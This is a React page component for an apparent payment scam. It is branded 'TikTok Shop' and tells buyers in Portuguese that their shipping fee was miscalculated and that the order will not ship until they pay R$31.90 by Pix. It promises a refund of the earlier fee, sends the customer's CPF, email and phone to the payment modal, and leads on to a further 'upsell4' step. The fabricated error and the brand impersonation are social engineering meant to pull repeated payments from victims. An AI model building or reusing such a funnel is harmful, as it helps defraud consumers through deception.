import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { goWithTracking } from "@/lib/tracking";
import { markCurrentPixPaid, setNextStep } from "@/components/upsell/funnel";
import { Check, AlertTriangle, X, CreditCard } from "lucide-react";
import PixModal from "@/components/upsell/PixModal";
import { useCustomerData } from "@/components/upsell/useCustomerData";
import { usePixPrefetch } from "@/components/upsell/usePixPrefetch";
import { upsellTokens, shadowCard, PINK } from "@/components/upsell/tokens";

const AMOUNT = 31.9;
const DETAILS = "Correcao de Frete";

export const Route = createFileRoute("/upsell3")({
  head: () => ({
    meta: [
      { title: "Correcao de Frete | TikTok Shop" },
      {
        name: "description",
        content: "Faca a correcao do frete da sua regiao para liberar o envio do pedido.",
      },
      { property: "og:title", content: "Correcao de Frete | TikTok Shop" },
      {
        property: "og:description",
        content: "Faca a correcao do frete da sua regiao para liberar o envio do pedido.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Upsell3,
});

function Upsell3() {
  const [showPixModal, setShowPixModal] = useState(false);
  const { data: customerData, isLoaded: customerLoaded } = useCustomerData();
  const { data: prefetchedPix, loading: prefetchLoading, error: prefetchError } = usePixPrefetch(
    AMOUNT,
    DETAILS,
    { data: customerData, isLoaded: customerLoaded },
    "upsell",
  );

  useEffect(() => {
    setNextStep("/upsell4");
  }, []);

  const handleSuccess = () => {
    setShowPixModal(false);
    localStorage.setItem("up3PaymentApproved", "true");
    markCurrentPixPaid("/upsell4");
    goWithTracking("/upsell4");
  };

  return (
    <div
      className="min-h-screen bg-secondary/30 flex flex-col items-center p-4 pt-8"
      style={upsellTokens}
    >
      <div className="w-full max-w-md space-y-4">
        {/* Card 1 - Pedido Concluído */}
        <div className={`bg-card rounded-2xl p-6 ${shadowCard} text-center animate-in fade-in duration-300`}>
          <div className="w-14 h-14 rounded-full bg-emerald-500 flex items-center justify-center mx-auto mb-4">
            <Check className="w-8 h-8 text-white" />
          </div>
          <h2 className="text-xl font-bold text-foreground mb-2">Pedido Concluído com Sucesso</h2>
          <p className="text-muted-foreground text-sm">Aguarde um momento...</p>
        </div>

        {/* Card 2 - Validação CEP */}
        <div className={`bg-card rounded-2xl p-6 ${shadowCard} text-center animate-in fade-in duration-300`}>
          <div className="w-14 h-14 rounded-full bg-amber-400 flex items-center justify-center mx-auto mb-4">
            <AlertTriangle className="w-8 h-8 text-white" />
          </div>
          <h2 className="text-xl font-bold text-foreground mb-2">
            Validação do CEP para Entrega
          </h2>
          <p className="text-muted-foreground text-sm">Estamos verificando as informações...</p>
        </div>

        {/* Card 3 - Erro Frete */}
        <div
          className={`bg-card rounded-2xl p-6 ${shadowCard} text-center border-2 border-rose-400 animate-in fade-in duration-300`}
        >
          <div className="w-14 h-14 rounded-full bg-rose-500 flex items-center justify-center mx-auto mb-4">
            <X className="w-8 h-8 text-white" />
          </div>
          <h2 className="text-xl font-bold text-foreground mb-2">
            O valor do Frete foi calculado errado para sua região
          </h2>
          <p className="text-muted-foreground text-sm mb-6">
            O pedido não será enviado. Faça a correção do pagamento do frete para que seu pedido
            seja enviado.
          </p>

          <button
            onClick={() => setShowPixModal(true)}
            className="w-full font-bold py-4 px-6 rounded-xl text-base transition-transform active:scale-[0.98] shadow-lg uppercase tracking-wide flex items-center justify-center gap-2 mb-4 text-white"
            style={{ backgroundColor: PINK }}
          >
            <CreditCard className="w-5 h-5" />
            PAGAR FRETE - R$ {AMOUNT.toFixed(2).replace(".", ",")}
          </button>

          <div className="bg-rose-100 rounded-xl p-3">
            <p className="text-rose-500 text-sm font-medium">
              O valor pago do frete anterior será reembolsado
            </p>
          </div>
        </div>
      </div>

      <PixModal
        isOpen={showPixModal}
        onClose={() => setShowPixModal(false)}
        amount={AMOUNT}
        title="Correcao de Frete"
        customerName={customerData.name}
        customerEmail={customerData.email}
        customerCpf={customerData.cpf}
        customerPhone={customerData.phone}
        details={DETAILS}
        paymentType="upsell"
        onSuccess={handleSuccess}
        prefetchedData={prefetchedPix}
        prefetchLoading={prefetchLoading}
        prefetchError={prefetchError}
      />
    </div>
  );
}
